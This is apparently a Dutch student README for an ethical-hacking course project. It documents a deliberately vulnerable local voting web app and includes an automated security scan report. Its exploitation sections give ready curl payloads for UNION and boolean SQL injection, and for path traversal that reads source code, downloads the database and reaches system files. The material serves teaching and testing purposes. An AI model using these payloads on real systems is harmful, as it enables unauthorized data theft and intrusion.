# OMMA Voting App - Ethical Hacking Project

**Student:** Moussa Moussaoui  
**Vak:** Ethical Hacking  
**Academiejaar:** 2025-2026  
**Datum:** 4 januari 2026

---

## Project Beschrijving

Een kwetsbare web applicatie gebouwd voor educatieve doeleinden. Gebruikers kunnen stemmen op honden of katten. De applicatie bevat **twee opzettelijke security vulnerabilities**:

1. **SQL Injection** - in het `/votes/search` endpoint
2. **Path Traversal** - in het `/reports/download` endpoint

**WAARSCHUWING:** Deze applicatie bevat opzettelijke security kwetsbaarheden. Alleen gebruiken voor educatieve doeleinden in een gecontroleerde omgeving.

---

## Vereisten

- **Python 3.8 of hoger**
- **pip** (Python package manager)
- **Git Bash** of Windows Terminal
- **curl** (voor het testen van endpoints)

---

## Installatie & Setup

### Stap 1: Installeer Dependencies

Open een terminal in de project directory en voer uit:

```bash
pip install -r requirements.txt
```

Dit installeert:
- `fastapi==0.115.6` - Web framework
- `uvicorn==0.34.0` - ASGI server
- `aiosqlite==0.19.0` - Async SQLite database
- `httpx==0.27.2` - HTTP client

### Stap 2: Start de Applicatie

```bash
python main.py
```

**Verwachte output:**
```
Starting OMMA Voting App (Honden vs Katten)...
Server: http://127.0.0.1:8080
API Docs: http://127.0.0.1:8080/docs
WARNING: Vulnerable endpoints active for demonstration!
[OK] Reports directory aangemaakt
[OK] Demo rapport aangemaakt
[OK] Database aangemaakt met demo data
```

**De applicatie draait nu op:** `http://127.0.0.1:8080`

### Stap 3: Verificatie

Open een nieuwe terminal en test of de server werkt:

```bash
curl http://127.0.0.1:8080/
```

Je zou een JSON response moeten zien met informatie over de applicatie.

---

## Normale Functionaliteit Testen

### Bekijk Stem Resultaten

```bash
curl http://127.0.0.1:8080/results
```

**Verwachte output:**
```json
{
  "total_votes": 4,
  "honden": 2,
  "katten": 2,
  "percentages": {
    "honden": 50.0,
    "katten": 50.0
  }
}
```

### Voeg een Stem Toe

```bash
curl -X POST "http://127.0.0.1:8080/vote?username=testuser&choice=hond"
```

**Verwachte output:**
```json
{
  "status": "success",
  "username": "testuser",
  "vote": "hond",
  "timestamp": "2026-01-04 15:30:00"
}
```

---

## Kwetsbaarheid 1: SQL Injection Exploitatie

### Wat is SQL Injection?

SQL Injection is een aanval waarbij een aanvaller malicious SQL code injecteert in een query. Door gebruik te maken van special characters zoals single quotes (`'`) en SQL keywords (`OR`, `UNION`), kan de database query worden gemanipuleerd.

### Normale Query (Legitiem)

```bash
curl "http://127.0.0.1:8080/votes/search?username=john_doe"
```

**Output:** Alleen de stemmen van `john_doe`

### Attack 1: Boolean-Based SQL Injection

```bash
curl "http://127.0.0.1:8080/votes/search?username=admin'+OR+'1'='1"
```

**Payload:** `admin' OR '1'='1`

**Wat gebeurt er?**
- Normale query: `SELECT * FROM votes WHERE username = 'john_doe'`
- Geïnjecteerde query: `SELECT * FROM votes WHERE username = 'admin' OR '1'='1'`
- De `OR '1'='1'` conditie is altijd waar → alle votes worden terugge

gegeven

**Verwachte output:** Alle 4 votes uit de database

### Attack 2: UNION-Based SQL Injection

```bash
curl "http://127.0.0.1:8080/votes/search?username='+UNION+SELECT+id,username,email,role+FROM+users--"
```

**Payload:** `' UNION SELECT id,username,email,role FROM users--`

**Wat gebeurt er?**
- De UNION operator combineert resultaten van twee queries
- De tweede query haalt data uit de `users` tabel
- De `--` comment operator negeert de rest van de originele query

**Verwachte output:** User data (usernames, emails, roles) uit de users tabel

### Attack 3: Comment-Based Bypass

```bash
curl "http://127.0.0.1:8080/votes/search?username='+OR+1=1+--"
```

**Payload:** `' OR 1=1 --`

**Wat gebeurt er?**
- `OR 1=1` is altijd waar
- `--` maakt de rest van de query tot comment

**Verwachte output:** Alle votes

### Impact

- **Data Exfiltratie:** Aanvaller kan alle votes en user data uit de database halen
- **Authentication Bypass:** Login systemen kunnen worden omzeild
- **Information Disclosure:** Gevoelige informatie wordt blootgelegd
- **Potential Data Modification:** In sommige gevallen kunnen data worden gewijzigd of verwijderd

---

## Kwetsbaarheid 2: Path Traversal Exploitatie

### Wat is Path Traversal?

Path Traversal (ook wel Directory Traversal) is een aanval waarbij een aanvaller `../` sequences gebruikt om uit de intended directory te breken en willekeurige bestanden op het systeem te lezen.

### Normale Query (Legitiem)

```bash
curl "http://127.0.0.1:8080/reports/download?file=voting_report_2026.txt"
```

**Output:** Inhoud van het voting rapport

### Attack 1: Lees Source Code

```bash
curl "http://127.0.0.1:8080/reports/download?file=../main.py"
```

**Payload:** `../main.py`

**Wat gebeurt er?**
- Normale path: `reports/voting_report_2026.txt`
- Gemanipuleerde path: `reports/../main.py` → resolves naar `main.py`
- De `../` navigeert één directory omhoog

**Verwachte output:** Volledige source code van main.py

### Attack 2: Lees Dependencies

```bash
curl "http://127.0.0.1:8080/reports/download?file=../requirements.txt"
```

**Verwachte output:** Lijst van gebruikte Python packages en versies

### Attack 3: Lees Database File

```bash
curl "http://127.0.0.1:8080/reports/download?file=../voting.db" --output stolen_database.db
```

**Wat gebeurt er?**
- De volledige SQLite database wordt gedownload
- Bevat alle votes, users, en andere data

**Verwachte output:** Database bestand opgeslagen als `stolen_database.db`

### Attack 4: Lees README

```bash
curl "http://127.0.0.1:8080/reports/download?file=../README.md"
```

**Verwachte output:** Inhoud van dit README bestand

### Attack 5: Multiple Directory Traversal (Windows)

```bash
curl "http://127.0.0.1:8080/reports/download?file=../../../../../../Windows/System32/drivers/etc/hosts"
```

**Verwachte output:** Windows hosts file (als permissions toelaten)

### Impact

- **Source Code Disclosure:** Volledige applicatie code is leesbaar
- **Configuration Files:** Database credentials en API keys kunnen worden gestolen
- **Database Exfiltration:** Volledige database kan worden gedownload
- **Information Disclosure:** Interne documentatie en system files zijn toegankelijk

---

## Aikido Security Scan

### Scan Setup

1. Repository verbonden met Aikido via GitHub integration
2. Automatische scan uitgevoerd op commit/push
3. SAST, dependency scanning, en secrets detection enabled

### Scan Resultaten

**Totaal Issues:** 2

**Issue 1: Starlette DOS Vulnerability**
- **Severity:** HIGH
- **Type:** Dependency vulnerability
- **Description:** DOS attack via algorithmic complexity in Starlette

**Issue 2: File Inclusion Attack**
- **Severity:** MEDIUM
- **Type:** Code vulnerability (Path Traversal)
- **Location:** main.py - download_report function

### Opmerking

Aikido heeft de **Path Traversal** kwetsbaarheid gedetecteerd, maar heeft de **SQL Injection** kwetsbaarheid NIET gevonden. Dit toont de limiteringen van automated security tools aan en benadrukt het belang van manual security testing.

---

## Video Demonstratie

De video demonstratie toont:

1. **Setup & Start** - Applicatie installeren en starten
2. **Normale Functionaliteit** - Stemmen toevoegen en resultaten bekijken
3. **SQL Injection Exploitatie** - Verschillende SQL injection attacks demonstreren
4. **Path Traversal Exploitatie** - Files buiten de intended directory lezen
5. **Aikido Scan Resultaten** - Gedetecteerde vulnerabilities tonen
6. **Impact Assessment** - Uitleg van de security risks

**Video Locatie:** [URL naar video wordt hier toegevoegd]

---

## Project Structuur

```
Omma/
├── main.py                  # Kwetsbare applicatie (ENIGE CODE BESTAND)
├── requirements.txt         # Python dependencies
├── README.md                # Dit document (STAPPENPLAN)
├── voting.db                # SQLite database (auto-created)
└── reports/                 # Reports directory (auto-created)
    └── voting_report_2026.txt
```

---

## Stoppen van de Applicatie

Druk in de terminal waar de applicatie draait op:

```
CTRL + C
```

---

## Troubleshooting

### Poort 8080 al in gebruik

Als je de error krijgt: `address already in use`

**Oplossing:**

```bash
# Windows: Vind het proces op poort 8080
netstat -ano | grep 8080

# Stop het proces (vervang PID met het process ID)
taskkill //PID <PID> //F
```

### Module niet gevonden

Als je een `ModuleNotFoundError` krijgt:

```bash
# Herinstalleer dependencies
pip install -r requirements.txt
```

### Database errors

Als je database errors krijgt:

```bash
# Verwijder de oude database en herstart
rm voting.db
python main.py
```

---

## Disclaimer

**WAARSCHUWING:** Deze applicatie bevat opzettelijke security vulnerabilities en mag ALLEEN worden gebruikt voor educatieve doeleinden in een gecontroleerde, lokale development omgeving. 

**NOOIT:**
- Deze code in productie gebruiken
- Deze applicatie op een publieke server draaien
- Deze techniques op systemen gebruiken zonder expliciete toestemming

Unauthorized hacking is illegaal onder de Computer Fraud and Abuse Act en equivalente wetgeving wereldwijd.

---

## Contact

**Student:** Moussa Moussaoui  
**Vak:** Ethical Hacking  
**Instelling:** Bachelor Elektronica-ICT - Jaar 3  
**Academiejaar:** 2025-2026

---

**Laatste Update:** 4 januari 2026  
**Versie:** 1.0
